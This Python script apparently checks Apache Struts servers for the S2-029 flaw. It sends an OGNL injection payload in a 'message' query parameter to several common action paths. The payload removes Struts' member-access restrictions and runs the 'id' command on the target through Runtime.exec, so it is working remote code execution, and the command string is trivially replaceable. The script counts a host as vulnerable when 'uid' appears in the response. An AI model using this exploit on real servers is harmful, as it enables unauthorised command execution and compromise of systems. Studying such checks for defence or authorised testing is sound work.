try:

    import requests,sys,os,logging,queue

except:
    os._exit(6)
logging.basicConfig(level=logging.INFO,format='%(message)s')
class VulTest:
    def __init__(self, url,port):
        dirs = ['/Simple!addInput.action','/Simple.action','/addUser.action','/listUser.action','/helloworld.action','/default.action']
        self.queues = queue.Queue(len(dirs))
        if '://' not in url:
            self.ip = url
            for dir in dirs:
                urls = 'http://' + url+":"+port+dir
                self.queues.put(urls)



    def Test(self):
        while not self.queues.empty():
            try:
                url = self.queues.get(False)
                req = requests.get(url + '''?message=(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()))''',timeout=3)
           
                if ('uid' in req.text):
                    logging.info('[+] Found S2-029 in ' + self.ip)
                    os._exit(1)
            except Exception as e:
                pass
        logging.info('[-] S2-029 Not Found in ' + self.ip)
        os._exit(2)


if __name__ == '__main__':
    url = sys.argv[1]
    port = sys.argv[2]
    #url = '192.168.136.130'
    test = VulTest(url,port)
    try:
        test.Test()
    except Exception as e:
        print(e)
        os._exit(3)
    

